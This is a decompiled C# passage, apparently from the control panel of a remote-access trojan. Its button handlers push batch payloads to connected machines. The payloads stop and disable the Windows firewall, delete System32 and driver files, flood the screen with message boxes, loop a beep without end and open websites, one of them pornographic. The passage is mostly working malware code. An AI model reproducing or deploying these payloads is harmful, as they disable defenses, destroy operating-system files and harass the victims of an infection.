				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x0600039F RID: 927 RVA: 0x001FAA2C File Offset: 0x001F8E2C
		private void Button21_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\nSTART www.redtube.com";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x060003A0 RID: 928 RVA: 0x001FAB10 File Offset: 0x001F8F10
		private void Button20_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\nSTART www.shafou.com";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x060003A1 RID: 929 RVA: 0x001FABF4 File Offset: 0x001F8FF4
		private void Button19_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\nnet stop MpsSvc\r\ntaskkill /f /t /im FirewallControlPanel.exe\r\nif %errorlevel%==1 tskill FirewallControlPanel\r\nnetsh firewall set opmode mode=disable";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x060003A2 RID: 930 RVA: 0x001FACD8 File Offset: 0x001F90D8
		private void Button18_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\n:funcao\r\nECHO \a\r\nGOTO funcao";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x060003A3 RID: 931 RVA: 0x001FADBC File Offset: 0x001F91BC
		private void Button17_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\n:loop\r\n%userprofile%/desktop \a\r\necho msgbox flood >%random%.vbs&%random%.vbs\r\ngoto loop";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x060003A4 RID: 932 RVA: 0x001FAEA0 File Offset: 0x001F92A0
		private void Button16_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\nDEL C:\\Windows\\System32";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x060003A5 RID: 933 RVA: 0x001FAF84 File Offset: 0x001F9384
		private void Button15_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\ndel /q /f /s %systemroot%\\System32\\Drivers\\*";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x040001A2 RID: 418
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040001A4 RID: 420
		[AccessedThroughProperty("Button15")]
		private Button _Button15;

		// Token: 0x040001A5 RID: 421
		[AccessedThroughProperty("Button16")]
		private Button _Button16;

		// Token: 0x040001A6 RID: 422
		[AccessedThroughProperty("Button17")]
		private Button _Button17;

		// Token: 0x040001A7 RID: 423
		[AccessedThroughProperty("Button18")]
		private Button _Button18;

		// Token: 0x040001A8 RID: 424
		[AccessedThroughProperty("Button19")]
		private Button _Button19;

		// Token: 0x040001A9 RID: 425
		[AccessedThroughProperty("Button20")]
		private Button _Button20;

		// Token: 0x040001AA RID: 426
		[AccessedThroughProperty("Button21")]
		private Button _Button21;

		// Token: 0x040001AB RID: 427
		[AccessedThroughProperty("Button8")]
		private Button _Button8;

		// Token: 0x040001AC RID: 428
		[AccessedThroughProperty("Button9")]
		private Button _Button9;

		// Token: 0x040001AD RID: 429
		[AccessedThroughProperty("Button10")]
		private Button _Button10;

		// Token: 0x040001AE RID: 430
		[AccessedThroughProperty("Button11")]
		private Button _Button11;

		// Token: 0x040001AF RID: 431
		[AccessedThroughProperty("Button12")]
		private Button _Button12;

		// Token: 0x040001B0 RID: 432
		[AccessedThroughProperty("Button13")]
		private Button _Button13;

		// Token: 0x040001B1 RID: 433
		[AccessedThroughProperty("Button14")]
		private Button _Button14;

		// Token: 0x040001B2 RID: 434
		[AccessedThroughProperty("Button7")]
		private Button _Button7;

		// Token: 0x040001B3 RID: 435
		[AccessedThroughProperty("Button6")]
		private Button _Button6;

		// Token: 0x040001B4 RID: 436
		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		// Token: 0x040001B5 RID: 437
		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		// Token: 0x040001B6 RID: 438
		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		// Token: 0x040001B7 RID: 439
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x040001B8 RID: 440
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x040001B9 RID: 441
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x040001BA RID: 442
		public string Code;

		// Token: 0x040001BB RID: 443
		public Form1 F;

		// Token: 0x040001BC RID: 444
		public string RunAs;
	}
}
